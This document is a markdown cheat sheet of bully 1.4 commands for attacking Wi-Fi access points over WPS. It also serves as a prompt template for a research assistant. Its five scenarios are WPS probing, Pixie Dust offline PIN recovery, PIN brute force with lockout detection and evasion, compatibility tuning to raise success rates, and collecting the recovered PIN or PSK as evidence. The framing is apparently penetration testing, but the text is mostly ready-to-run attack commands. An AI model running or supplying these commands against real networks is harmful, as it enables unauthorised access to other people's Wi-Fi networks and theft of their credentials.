# bully — command scenarios for deep research

Installed build: bully v1.4 (kimocoder fork). Flags come from `help.txt`.

## How to invoke

```text
@deep-research For bully 1.4 against current consumer APs, which Pixie Dust
chipsets still yield an offline PIN, what lockout behaviour should be expected
per vendor, and which advanced flags (-W, -D, -L, -Z) actually change success
rates? Cite bully/pixiewps docs, chipset advisories, and field reports; return
a decision tree for test vs attack mode.
```

---

## Scenario 1 — confirm WPS before attacking

| # | Command | How to use |
|---|---------|------------|
| 1 | `sudo iw dev wlan1 set type monitor` | Monitor mode (with link down/up around it) |
| 2 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -T` | Test mode, no injection |
| 3 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -Q -T` | Probe for WPS info |
| 4 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -P -T` | Non-beaconing AP probe |
| 5 | `sudo bully wlan1 -e "CorpNet" -c 6 -Q -T` | Target by ESSID |

**Research questions**
- Does `-Q` reveal WPS version and locked state on this AP?
- Is test mode genuinely passive on all drivers?

**Sources:** bully README, WPS specification, `iw` docs.
**Output:** a WPS reachability verdict with zero injected frames.

---

## Scenario 2 — Pixie Dust first

| # | Command | How to use |
|---|---------|------------|
| 6 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -d` | Offline Pixie Dust attempt |
| 7 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -d -w /evidence/bully` | Persist session files |
| 8 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -d -v 4` | Verbose diagnostics |
| 9 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -d -5` | Include 5 GHz hopping |

**Research questions**
- Which chipsets are vulnerable to Pixie Dust in 2026?
- Does `-5` help when the AP is dual-band with the same BSSID?

**Sources:** pixiewps README, chipset CVE notes, field reports.
**Output:** a recovered PIN or a documented non-vulnerable result.

---

## Scenario 3 — PIN brute force with lockout control

| # | Command | How to use |
|---|---------|------------|
| 10 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6` | Default random PIN order |
| 11 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -S` | Sequential PINs |
| 12 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -B` | Brute-force checksum digit |
| 13 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -l 120` | Wait 120 s on lockout |
| 14 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -D` | Detect unreported lockouts |
| 15 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -L` | Ignore reported locks (risky) |
| 16 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -w /evidence/bully -i 1000` | Resume from an index |

**Research questions**
- What lockout schedule does the target vendor use?
- Does `-D` prevent false progress after a silent lock?

**Sources:** vendor manuals, bully issues, AP logs.
**Output:** a PIN or a lockout profile.

---

## Scenario 4 — compatibility tuning

| # | Command | How to use |
|---|---------|------------|
| 17 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -W` | Windows 7 registrar emulation |
| 18 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -Z` | Suppress throttling |
| 19 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -A` | Disable ACK checks |
| 20 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -C` | Skip CRC/FCS validation |
| 21 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -N -R` | Header/FCS assumptions |
| 22 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -1 2,3 -2 5,1` | NACK backoff tuning |

**Research questions**
- Which APs only accept a Windows 7 registrar?
- Do `-A`/`-C` improve throughput or just hide errors?

**Sources:** bully issues, packet captures, vendor WPS behaviour.
**Output:** a working parameter set for the target model.

---

## Scenario 5 — evidence and cleanup

| # | Command | How to use |
|---|---------|------------|
| 23 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -o /evidence/bully.log` | Capture messages to file |
| 24 | `sudo bully wlan1 -b AA:BB:CC:DD:EE:FF -c 6 -v 1` | Quiet run for scripts |
| 25 | `ls -la /evidence/bully` | Inspect session artefacts |
| 26 | `sudo ip link set wlan1 down && sudo iw dev wlan1 set type managed && sudo ip link set wlan1 up` | Restore managed mode |

**Research questions**
- Which files in the workdir contain the recovered PIN/PSK?
- What evidence-retention rules apply to WPS credentials?

**Sources:** bully source, engagement policy.
**Output:** a timestamped evidence bundle and a restored adapter.

## Flag coverage checklist

| Help group | Flags | Scenario |
|------------|-------|----------|
| Required | `interface -b/-e` | 1–3 |
| Optional | `-c -i -l -o -p -s -u -v -w -5 -B -F -S -T` | 1–5 |
| Advanced | `-d -a -r -m -t -1 -2 -A -C -D -E -L -M -N -P -Q -R -W -Z -V -h` | 2–4 |

## Scenario index

| Scenario | Commands |
|----------|----------|
| 1 — confirm WPS | 5 |
| 2 — Pixie Dust | 4 |
| 3 — PIN brute force | 7 |
| 4 — compatibility | 6 |
| 5 — evidence/cleanup | 4 |
